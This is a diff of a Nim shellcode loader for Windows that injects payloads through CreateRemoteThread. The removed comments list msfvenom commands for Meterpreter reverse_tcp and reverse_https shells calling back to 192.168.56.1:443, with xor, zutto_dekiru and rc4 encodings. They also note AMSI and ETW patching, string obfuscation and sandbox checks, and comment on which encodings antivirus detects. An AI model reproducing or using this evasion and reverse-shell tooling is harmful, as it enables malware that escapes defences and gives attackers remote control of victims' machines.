@@ -5,12 +5,6 @@
 ]#
 
 
-# nim c -d:release -d:danger -d:mingw --cpu=amd64 -d:strip --opt:size src/shellcode_bin.nim
-# added the "amsi_patch_bin.nim" content as a func
-# added the strenc module import for a bit more obfuscation
-# added the "etw_patch_bin.nim" content as a func
-# added sandbox checks from NimHollow
-
 import winim/lean
 import osproc
 import strformat
@@ -179,15 +173,6 @@ proc injectCreateRemoteThread[I, T](shellcode: array[I, T]): void =
 
 
 when defined(windows):
-        # msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.1 EXITFUNC=thread LPORT=443 -f csharp                           
-        # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.56.1 LPORT=443 EXITFUNC=thread -f csharp
-        # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.56.1 LPORT=443 EXITFUNC=thread -e x64/xor -b '\x00' -f csharp
-        # the xored version is caught by AV. lol.
-        # stageencoder yes
-        # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.56.1 LPORT=443 EXITFUNC=thread -e x64/zutto_dekiru -b '\x00' -f csharp
-        # xor encoded payloads are much more detected by defender than regular one
-        # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.56.1 LPORT=443 EXITFUNC=thread -b \x00\x0a\x0d --encrypt rc4 --encrypt-key japonais -f csharp
-
 
     when defined amd64:
         echo "[*] Running in x64 process"
